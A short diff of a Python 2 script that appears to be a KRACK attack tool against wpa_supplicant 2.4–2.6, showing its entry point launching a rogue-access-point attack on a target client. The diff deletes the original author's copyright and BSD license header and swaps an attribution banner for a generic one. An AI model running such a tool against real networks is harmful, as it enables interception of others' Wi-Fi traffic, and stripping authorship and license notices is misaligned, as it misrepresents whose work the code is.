@@ -1,11 +1,5 @@
 #!/usr/bin/env python2
 
-# wpa_supplicant v2.4 - v2.6 all-zero encryption key attack
-# Copyright (c) 2017, Mathy Vanhoef <Mathy.Vanhoef@cs.kuleuven.be>
-#
-# This code may be distributed under the terms of the BSD license.
-# See README for more details.
-
 import sys, os
 username = os.path.expanduser(os.environ["SUDO_USER"])
 sys.path.append('/home/' + username + '/.local/lib/python2.7/site-packages')
@@ -587,7 +581,7 @@ if __name__ == "__main__":
 
 	global_log_level = max(ALL, global_log_level - args.debug)
 
-	print "\n\t===[ KRACK Attacks against Linux/Android by Lucas Woody ]===\n"
+	print "\n\t===[ KRACK Attacks WPA2 ]===\n"
 	attack = KRAckAttack(args.nic_real_mon, args.nic_rogue_ap, args.nic_rogue_mon, args.nic_ether, args.ssid, args.target, args.dump, args.continuous_csa)
 	atexit.register(cleanup)
 	attack.run(strict_echo_test=args.strict_echo_test)
